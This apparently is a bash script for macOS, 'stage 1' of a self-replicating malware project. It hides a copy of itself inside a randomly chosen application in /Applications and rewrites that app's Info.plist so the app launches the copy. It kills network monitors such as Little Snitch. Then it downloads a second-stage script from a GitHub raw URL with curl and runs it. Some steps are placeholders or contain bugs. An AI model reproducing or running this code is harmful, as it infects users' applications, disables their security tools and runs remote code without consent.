#!/bin/bash
#sed -E/-e fix is thanks to https://stackoverflow.com/a/28072266/
#Stage 1, re-written:
DEBUG=1
#LOGGING isn't dependent anymore on DEBUG being enabled (1)
LOGGING=1
OrigPath=$(pwd)
TryCount=1
Path=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
cd "${Path}"
if [ ${LOGGING} == 1 ]
then
	if [ -f ./.stage-1.log ]
	then
		#Thanks to https://stackoverflow.com/a/64124941/
		#Works:
		RC01=$(sed -n "s/\(.*[^0-9]\)\([0-9]*\)$/\2/p;q" ./.stage-1.log)
		RC02=${RC01}
		let "RC02++"
		sed -i '' "1s/${RC01}\$/${RC02}/" ./.stage-1.log
		echo "" >> ./.stage-1.log
	else
		#Create local log, a run count, and a replication count (to be edited at
		#the end)
		touch ./.stage-1.log
		echo "Run count: 1" >> ./.stage-1.log
		echo "Replication count: 0" >> ./.stage-1.log
		echo "" >> ./.stage-1.log
	fi
fi
#The $0 in $Script prints the script name, except it starts with ./
#The solution for this is to add a forward slash right before it.
Script=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )/$0
if [ ${DEBUG} == 1 ]
then
	echo "Script is ${Script}"
fi
if [ ${LOGGING} == 1 ]
then
	echo "Script is ${Script}" >> ./.stage-1.log
fi
#It appears that some plists are gibberish for some reason, they can be identified 
#by ${ExecLineNum} having a value of 1 (after let adding one to its value)
IsReadablePlist="false"
IsAlreadyPresent="true"
while [ ${IsReadablePlist} == "false" ] && [ ${IsAlreadyPresent} == "true" ] 
do
	#Application roulette; copied from stage-1-old:
	loc=(/Applications/*)
	Target="${loc[RANDOM % ${#loc[@]}]}"
	TargetPlist="${Target}/Contents/Info.plist"
	if [ ${DEBUG} == 1 ]
	then
		echo "Target is ${Target}"
		echo "TargetPlist is ${TargetPlist}"
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "Target is ${Target}" >> ./.stage-1.log
		echo "TargetPlist is ${TargetPlist}" >> ./.stage-1.log
	fi
	#Using sed to get the line number where the executable name is stored in the
	#target application's Info.plist (by looking for CFBundleExecutable and then
	#adding 1):
	ExecLineNum=$(sed -n "/CFBundleExecutable/=" "${TargetPlist}")
	let "ExecLineNum++"
	if [ ${DEBUG} == 1 ]
	then
		echo "ExecLineNum is ${ExecLineNum}"
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "ExecLineNum is ${ExecLineNum}" >> ./.stage-1.log
	fi
	if [ ${ExecLineNum} == 1 ]
	then
		if [ ${DEBUG} == 1 ]
		then
			echo "IsReadablePlist == false"
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "IsReadablePlist == false" >> ./.stage-1.log
		fi
		let "TryCount++"
		IsReadablePlist="false"
	else
		if [ ${DEBUG} == 1 ]
		then
			echo "IsReadablePlist == true"
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "IsReadablePlist == true" >> ./.stage-1.log
		fi
		ExecLineFull=$(sed -n "${ExecLineNum}p" "${TargetPlist}")
		TmpName=$RANDOM
		echo "${ExecLineFull}" >> "/private/tmp/${TmpName}"
		if [ ${DEBUG} == 1 ]
		then
			echo "ExecLineFull is ${ExecLineFull}"
			echo "TmpName is ${TmpName}"
			echo "TmpName file is /private/tmp/${TmpName}"
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "ExecLineFull is ${ExecLineFull}" >> ./.stage-1.log
			echo "TmpName is ${TmpName}" >> ./.stage-1.log
			echo "TmpName file is /private/tmp/${TmpName}" >> ./.stage-1.log
		fi
		#For some reason the -E (not -e) is necessary here:
		ExecName=$(sed -nE "/<string>/ s/.*<string>([^<]+).*/\1/p" "/private/tmp/${TmpName}")
		if [ ${DEBUG} == 1 ]
		then
			echo "ExecName is ${ExecName}"
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "ExecName is ${ExecName}" >> ./.stage-1.log
		fi
		rm "/private/tmp/${TmpName}"
		if [ ! -f "/private/tmp/${TmpName}" ]
		then
			if [ ${DEBUG} == 1 ]
			then
				echo "TmpName file deleted"
			fi
			if [ ${LOGGING} == 1 ]
			then
				echo "TmpName file deleted" >> ./.stage-1.log
			fi
		fi
		#If ${ExecName} starts with a . (aka is hidden) then repeat this loop
		if [[ ${ExecName} == .* ]]
		then
			if [ ${DEBUG} == 1 ]
			then
				echo "IsAlreadyPresent == true"
			fi
			if [ ${LOGGING} == 1 ]
			then
				echo "IsAlreadyPresent == true" >> ./.stage-1.log
			fi
			let "TryCount++"
			IsAlreadyPresent="true"
		else
			if [ ${DEBUG} == 1 ]
			then
				echo "IsAlreadyPresent == false"
			fi
			if [ ${LOGGING} == 1 ]
			then
				echo "IsAlreadyPresent == false" >> ./.stage-1.log
				let "TryCount++"
			fi
			IsAlreadyPresent="false"
		fi
		IsReadablePlist="true"
	fi
done
#Check for stage 1 removal file (/Users/Shared/.stage-1.sh)
#This location was chosen because all other non-commonly-visited [but always
#present] directories [other than /private/tmp/, but that's temporary] require
#sudo/root perms)
if [ -f /Users/Shared/.stage-1.sh ]
then
	if [ ${DEBUG} == 1 ]
	then
		echo "/Users/Shared/.stage-1.sh present"
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "/Users/Shared/.stage-1.sh present" >> ./.stage-1.log
	fi
else
	touch "/Users/Shared/.stage-1.sh"
	echo "#!/bin/bash"
	echo "#Replication count: 0" >> "/Users/Shared/.stage-1.sh"
	echo "" >> "/Users/Shared/.stage-1.sh"
	if [ ${DEBUG} == 1 ]
	then
		echo "/Users/Shared/.stage-1.sh not present"
		echo "/Users/Shared/.stage-1.sh created"
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "/Users/Shared/.stage-1.sh not present" >> ./.stage-1.log
		echo "/Users/Shared/.stage-1.sh created" >> ./.stage-1.log
	fi
fi
#Copy this script over to target
TScript="${Target}/Contents/MacOS/.${ExecName}"
cp "${Script}" "${TScript}"
if [ -f "${TScript}" ]
then
	SuccessfulCopy="true"
else
	SuccessfulCopy="false"
fi
if [ ${DEBUG} == 1 ]
then
	echo "TScript is ${TScript}"
	echo "SuccessfulCopy == ${SuccessfulCopy}"
fi
if [ ${LOGGING} == 1 ]
then
	echo "TScript is ${TScript}" >> ./.stage-1.log
	echo "SuccessfulCopy == ${SuccessfulCopy}" >> ./.stage-1.log
fi
if [ ${SuccessfulCopy} == "true" ]
then
	#Change (delete and then add) the last line of TScript:
	sed -i '' -e '$ d' "${TScript}"
	echo "./${ExecName}" >> "${TScript}"
	#Add TScript to the log for removal:
	echo "${TScript}" >> "/Users/Shared/.stage-1.sh"
	#Edit target's info.plist:
	#Need to test if the following line works, if not try adding a \$ after the first ${ExecName}
	sed -i '' "${ExecLineNum}s/${ExecName}/.${ExecName}/" "${TargetPlist}"
	if [ ${DEBUG} == 1 ]
	then
		echo "${TargetPlist} edited"
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "${TargetPlist} edited" >> ./.stage-1.log
	fi
	NewExecLineFull=$(sed -n "${ExecLineNum}p" "${TargetPlist}")
	echo "${NewExecLineFull}" >> "/private/tmp/${TmpName}"
	if [ ${DEBUG} == 1 ]
	then
		echo "NewExecLineFull is ${NewExecLineFull}"
		echo "TmpName file created"
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "NewExecLineFull is ${NewExecLineFull}" >> ./.stage-1.log
		echo "TmpName file created" >> ./.stage-1.log
	fi
	#For some reason the -E (not -e) is necessary here:
	NewExecName=$(sed -nE "/<string>/ s/.*<string>([^<]+).*/\1/p" "/private/tmp/${TmpName}")
	#Write the NewExecName to the log for removal
	echo "${NewExecName}" >> "/Users/Shared/.stage-1.sh"
	if [ ${DEBUG} == 1 ]
	then
		echo "NewExecName is ${NewExecName}"
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "NewExecName is ${NewExecName}" >> ./.stage-1.log
	fi
	rm "/private/tmp/${TmpName}"
	if [ ! -f "/private/tmp/${TmpName}" ]
	then
		if [ ${DEBUG} == 1 ]
		then
			echo "TmpName file deleted"
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "TmpName file deleted" >> ./.stage-1.log
		fi
	fi
	#If ${ExecName} starts with a . (aka is hidden) then the replication was 
	#successful
	SuccessfulReplication="false"
	if [[ ${NewExecName} = .* ]]
	then
		SuccessfulReplication="true"
	else
		SuccessfulReplication="false"
		rm "${TScript}"
	fi
	if [ ${DEBUG} == 1 ]
	then
		echo "SuccessfulReplication == ${SuccessfulReplication}"
		if [ ! -f "${TScript}" ]
		then
			echo "TScript has been removed, or wasn't moved in the first place"
		fi
	fi
	if [ ${LOGGING} == 1 ]
	then
		echo "SuccessfulReplication == ${SuccessfulReplication}" >> ./.stage-1.log
		if [ ! -f "${TScript}" ]
		then
			echo "TScript has been removed, or wasn't moved in the first place" >> ./.stage-1.log
		fi
	fi
fi
if [ ${SuccessfulCopy} == "true" ] && [ ${SuccessfulReplication} == "true" ]
then
	RC03=$(sed -n "2!d;s/\(.*[^0-9]\)\([0-9]*\)$/\2/p;q" "/Users/Shared/.stage-1.sh")
	RC04=${RC03}
	let "REPC04++"
	sed -i '' "2s/${RC03}\$/${RC04}/" "/Users/Shared/.stage-1.sh"
	echo "rm ${TScript}" >> "/Users/Shared/.stage-1.sh"
	#Test this line, if it doesn't work see line 218 for what to try:
	echo "sed -i '' '${ExecLineNum}s/${NewExecName}/${ExecName}/' '${TargetPlist}'"
	if [ ${LOGGING} == 1 ]
	then
		RC05=$(sed -n "2!d;s/\(.*[^0-9]\)\([0-9]*\)$/\2/p;q" ./.stage-1.log)
		RC06=${RC05}
		let "RC06++"
		sed -i '' "2s/${RC05}\$/${RC06}/" ./.stage-1.log
	fi
fi	
#TryCount trigger for Stage 2
#There are 34 system applications/directories in /Applications/ as of macOS Sierra.
#That means that 25 is probably a reasonable number of tries before triggering
#stage 2.
if [ ${TryCount} >= 25 ]
then
	#Network monitor killer and stage 2 downloader (originally from stage-1-old):
	#Should check if processes are running, before and after attempting to kill them
	NMLU=/Applications/LuLu.app
	NMHO="/Applications/Hands Off!.app"
	NMLS=/Applications/Little\ Snitch\ Configuration.app
	if [ -d "$NMLU" ] 
	then
		if [ ${DEBUG} == 1 ]
		then
			echo "LuLu found. Killing..."
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "LuLu found. Killing..." >> ./.stage-1.log
		fi
		#Kill LuLu:
		#placeholder
	elif [ -d "$NMHO" ]
	then
		if [ ${DEBUG} == 1 ]
		then
			echo "Hands Off! found. Killing..."
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "Hands Off! found. Killing..." >> ./.stage-1.log
		fi
		#Kill Hands Off!:
		#placeholder
	elif [ -d "$NMLS" ]
	then
		if [ ${DEBUG} == 1 ]
		then
			echo "Little Snitch found. Killing..."
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "Little Snitch found. Killing..." >> ./.stage-1.log
		fi
		#Kill Little Snitch:
		killall "Little Snitch Agent"
		killall "Little Snitch Configuration"
		killall "Little Snitch Network Monitor"
	else
		if [ ${DEBUG} == 1 ]
		then
			echo "No network monitors found"
		fi
		if [ ${LOGGING} == 1 ]
		then
			echo "No network monitors found" >> ./.stage-1.log
		fi
	fi
	curl https://raw.githubusercontent.com/The-SamminAter/lol-limewire/master/stage-2.sh > ./.stage-2.sh
	./.stage-2.sh
fi
cd "${OrigPath}"
#Placeholder